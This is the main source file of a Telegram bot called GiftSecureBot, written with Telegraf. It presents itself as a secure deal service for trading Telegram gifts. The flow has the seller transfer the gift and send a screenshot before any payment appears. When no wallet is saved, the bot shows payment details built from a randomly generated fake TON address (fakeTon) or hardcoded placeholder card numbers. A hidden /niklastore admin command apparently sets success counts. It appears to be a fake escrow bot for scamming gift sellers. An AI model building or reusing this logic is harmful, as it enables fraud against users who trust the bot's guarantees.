// src/index.js
import 'dotenv/config'
import { Telegraf, Scenes, session } from 'telegraf'

import { showScreen, resetScreen } from './brand.js'
import start, { setStartMessageId } from './commands/start.js'
import deeplink from './commands/deeplink.js'
import niklastore from './commands/niklastore.js'

import { walletManageScene } from './scenes/walletManage.js'
import { createDealWizard } from './scenes/createDeal.js'

import {
  mainMenuKb,
  sellerGiftConfirmKb,
  sellerShotSentKb
} from './keyboards.js'

import db, { initDB } from './db.js'

/* ======================== INIT ======================== */
await initDB()
if (!process.env.BOT_TOKEN) { console.error('❌ BOT_TOKEN не задан'); process.exit(1) }

const bot = new Telegraf(process.env.BOT_TOKEN)
const stage = new Scenes.Stage([walletManageScene, createDealWizard])
bot.use(session())
bot.use(stage.middleware())

/* =================== USERNAME ======================== */
let BOT_USERNAME = process.env.BOT_USERNAME || null
if (!BOT_USERNAME) {
  try { const me = await bot.telegram.getMe(); BOT_USERNAME = me?.username } catch {}
}

/* ============== ГЛОБАЛЬНАЯ АВТООЧИСТКА =================
   — Не трогаем сообщения пользователя, если он в сцене
   — Удаляем только "чужие" старые сообщения с inline-кнопками
========================================================= */
bot.use(async (ctx, next) => {
  // удаляем ТОЛЬКО кликнутое сообщение, если это не наш "экран" и не сцена
  if (ctx.callbackQuery?.message?.message_id) {
    const clickedId = ctx.callbackQuery.message.message_id
    const screenId = ctx.session?.screenMsgId
    if (screenId && screenId !== clickedId) {
      try { await ctx.telegram.deleteMessage(ctx.chat.id, clickedId) } catch {}
    }
  }

  // ВАЖНО: если пользователь в сцене, не удаляем его текст — сцене нужно его прочитать
  const inScene = Boolean(ctx.scene?.current?.id)
  if (!inScene && ctx.message?.message_id && !ctx.message.via_bot) {
    // вне сцены — чистим пользовательские сообщения
    try { await ctx.deleteMessage() } catch {}
  }

  await next()
})

/* ===================== /START ========================= */
bot.start(async (ctx) => {
  await resetScreen(ctx)

  // если внутри сцен — позволяем сцене самой завершиться
  if (ctx.scene?.current?.id === 'create-deal' || ctx.scene?.current?.id === 'wallet-manage') return

  try { await ctx.scene.leave() } catch {}

  if (typeof ctx.startPayload === 'string' && ctx.startPayload.length >= 4) {
    return deeplink(ctx)
  }
  return start(ctx)
})

/* ==================== ГЛОБАЛЬНАЯ «НАЗАД» =============== */
bot.action('back:menu', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  await resetScreen(ctx)
  return start(ctx)
})

/* ==================== ВСПОМОГАТЕЛЬНОЕ ================== */
async function openScene(ctx, name) {
  await resetScreen(ctx)
  return ctx.scene.enter(name)
}

/* ==================== ГЛАВНОЕ МЕНЮ ==================== */
bot.action('deal:create', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  return openScene(ctx, 'create-deal')
})

bot.action('wallet:manage', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  return openScene(ctx, 'wallet-manage')
})

bot.action('w:WITHDRAW', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  ctx.session.goWithdraw = true
  return openScene(ctx, 'wallet-manage')
})

bot.action('help:how', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const text =
`Как работает:

1) Продавец создаёт сделку → «Ожидаем покупателя».
2) Покупатель присоединяется → продавцу показываются шаги по подарку.
3) Продавец: «Подарок отправлен» → «Да, передал(а) подарок» → «📸 Отправил(а) скриншот».
4) Бот показывает реквизиты оплаты обеим сторонам по валюте (RUB/UAH/TON/Stars).
5) Покупатель оплачивает по реквизитам.`
  return showScreen(ctx, text, mainMenuKb())
})

/* =================== /niklastore ====================== */
bot.command('niklastore', async (ctx) => niklastore(ctx))

/* ============== ПРОДАВЕЦ: ПОДАРОК ОТПРАВЛЕН =========== */
bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return showScreen(ctx, 'Сделка не найдена', mainMenuKb())
  if (deal.sellerId !== ctx.from.id) return showScreen(ctx, 'Не ваша сделка', mainMenuKb())

  deal.status = 'gift_sent'
  deal.log ||= []; deal.log.push('Продавец: нажал «Подарок отправлен».')
  await db.write()

  return showScreen(ctx, 'Вы точно передали подарок?', sellerGiftConfirmKb(token))
})

/* ===== ПРОДАВЕЦ: ПОДТВЕРДИЛ, ЧТО ПЕРЕДАЛ ПОДАРОК ======= */
bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return showScreen(ctx, 'Сделка не найдена', mainMenuKb())
  if (deal.sellerId !== ctx.from.id) return showScreen(ctx, 'Не ваша сделка', mainMenuKb())

  deal.log ||= []; deal.log.push('Продавец подтвердил передачу подарка.')
  await db.write()

  await showScreen(ctx, 'Пришлите скриншот передачи подарка покупателю.', sellerShotSentKb(token))
  if (deal.buyerId) {
    try { await ctx.telegram.sendMessage(deal.buyerId, '🎁 Продавец подтвердил передачу подарка. Ожидаем скриншот.') } catch {}
  }
})

/* ===== ПРОДАВЕЦ: «📸 ОТПРАВИЛ(А) СКРИНШОТ» → РЕКВИЗИТЫ === */
function fakeTon() {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
  let s = 'UQ'
  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
  return s
}
function detectRubType(val = '') {
  const v = (val || '').replace(/\s+/g, '')
  const looksCard = /^\d{16,19}$/.test(v)
  const looksPhone = /^(\+7|7|8)\d{10}$/.test(v)
  return looksCard ? 'card' : (looksPhone ? 'phone' : null)
}

bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return showScreen(ctx, 'Сделка не найдена', mainMenuKb())
  if (deal.sellerId !== ctx.from.id) return showScreen(ctx, 'Не ваша сделка', mainMenuKb())

  deal.status = 'await_payment'
  deal.log ||= []; deal.log.push('Продавец нажал «Скриншот отправлен». Ожидаем оплату.')
  await db.write()

  const seller = db.data.users[deal.sellerId] || {}
  const w = seller.wallets || {}

  let payLine = ''
  if (deal.currency === 'TON') {
    const addr = w.TON || fakeTon()
    payLine = `Отправьте *${deal.amount} TON* на адрес:\n\`${addr}\``
  } else if (deal.currency === 'RUB') {
    const rub = (w.RUB || '').trim()
    const t = detectRubType(rub)
    if (t === 'phone') {
      payLine = `Отправьте *${deal.amount} RUB* на номер телефона:\n\`${rub}\``
    } else {
      const card = rub || '2200 1234 5678 9012'
      payLine = `Отправьте *${deal.amount} RUB* на карту:\n\`${card}\``
    }
  } else if (deal.currency === 'UAH') {
    const card = (w.UAH || '5375 1234 5678 9012').trim()
    payLine = `Отправьте *${deal.amount} UAH* на карту:\n\`${card}\``
  } else if (deal.currency === 'STARS') {
    payLine = `Оплатите *${deal.amount} Stars* через Fragment или подарками в Telegram.\n_Комиссия на покупателе._`
  }

  const body = `⏳ Ожидание оплаты от покупателя.\n\n${payLine}`
  await showScreen(ctx, '📸 Скриншот зафиксирован. Ожидаем оплату от покупателя.', undefined)
  try { if (deal.buyerId) await ctx.telegram.sendMessage(deal.buyerId, body, { parse_mode: 'Markdown' }) } catch {}
  try { await ctx.telegram.sendMessage(deal.sellerId, body, { parse_mode: 'Markdown' }) } catch {}
})

/* ================ ПРОДАВЕЦ ОТМЕНЯЕТ СДЕЛКУ =============== */
bot.action(/seller:cancel:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]

  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return showScreen(ctx, 'Сделка не найдена', mainMenuKb())
  if (deal.sellerId !== ctx.from.id) return showScreen(ctx, 'Не ваша сделка', mainMenuKb())

  deal.status = 'canceled'
  deal.log ||= []; deal.log.push('Продавец отменил сделку.')
  await db.write()

  await showScreen(ctx, '❌ Сделка отменена.', mainMenuKb())
  if (deal.buyerId) {
    try { await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.') } catch {}
  }
})

/* ===== ФОЛЛБЕК СООБЩЕНИЙ (НЕ ЛОМАЕМ СЦЕНЫ!) ===== */
bot.on('message', async (ctx) => {
  // если в сцене — НИЧЕГО не делаем (пусть сцена обработает текст)
  if (ctx.scene?.current?.id) return

  // niklastore ввод числа — обрабатывается в другом месте
  if (ctx.session?.adminAwaitSuccessCount) return

  // иначе держим один главный экран
  return start(ctx)
})

/* ================== ПУСК БОТА =========================== */
await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {})
await bot.launch()
console.log('GiftSecureBot RUNNING ✅')

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))